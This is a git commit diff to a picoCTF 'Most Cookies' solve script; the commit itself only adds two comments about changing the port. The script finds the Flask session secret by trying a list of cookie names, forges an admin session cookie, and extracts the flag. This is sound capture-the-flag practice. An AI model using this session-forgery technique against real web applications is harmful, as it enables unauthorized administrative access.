b4b19993aebfe1bdf5e7570deae401c16f7fb646
Picowriteup <139550617+Picowriteup@users.noreply.github.com>
2023-07-17 15:47:34 +0800

    Update solve.py

--- MOST_COOKIES_UPDATED/solve.py
+++ MOST_COOKIES_UPDATED/solve.py
@@ -5,7 +5,7 @@ import re
 from unittest.mock import patch, mock_open
 with patch("builtins.open", mock_open(read_data="dummy_flag")):
     import server
-
+#####################CHANGE THE PORT (52134) TO YOU PORT ################
 res = requests.post("http://mercury.picoctf.net:52134/search", data={"name": "snickerdoodle"})
 server_cookie = res.cookies["session"]
 
@@ -17,6 +17,7 @@ for cookie in server.cookie_names:
         print(f"Found correct key: {cookie}, contents = {out}")
         new_cookie = manageFlaskSession.encodeFlaskCookie(cookie, {u'very_auth': 'admin'})
         print(f"New cookie: {new_cookie}")
+        #####################CHANGE THE PORT (52134) TO YOU PORT ################
         res = requests.get("http://mercury.picoctf.net:52134/display", cookies={"session": new_cookie})
         if match := re.search(r"picoCTF{[^}]+}", res.text):
             print (f"The flag: {match.group(0)}")
